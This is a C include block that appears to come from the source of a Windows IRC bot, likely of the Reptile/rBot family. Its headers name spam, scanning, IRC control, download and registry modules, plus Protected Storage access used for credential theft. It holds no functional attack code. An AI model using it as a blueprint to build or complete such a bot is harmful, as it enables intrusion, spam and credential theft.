#define _WIN32_WINNT 0x0403
#define WIN32_LEAN_AND_MEAN
#ifndef _DEBUG
#pragma optimize("gsy", on)
#pragma comment(linker,"/ALIGN:4096 /IGNORE:4108 /RELEASE /IGNORE:4089")
#else
#pragma comment(linker,"/NODEFAULTLIB:MSVCRTD")
#endif

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <shlwapi.h>//PathRemoveFileSpec()
#include <list>
#include <sqlext.h>
#include <ntsecapi.h>
#include <string.h>//fu

#include <sys\types.h> // for filesize function
#include <sys\stat.h>  // ^

#include "defines.h"

#ifndef NO_PSTORE
#include <commctrl.h>
#import "pstorec.dll" no_namespace
#include "pstore.h"
#endif

#include "Psapi.h"

#include "crypt.h"
#include "secure.h"
#include "service.h"
#include "visit.h"

#include "spambot.h"
#include "advscan.h"
#include "asn.h"

#include "loaddlls.h"
#include "reptile.h"
#include "info.h"
#include "utility.h"
#include "irc.h"
#include "commands.h"
#include "protocol.h"
#include "threads.h"
#include "externs.h"
#include "processes.h"
#include "regcontrol.h"
#include "download.h"
#include "netutils.h"
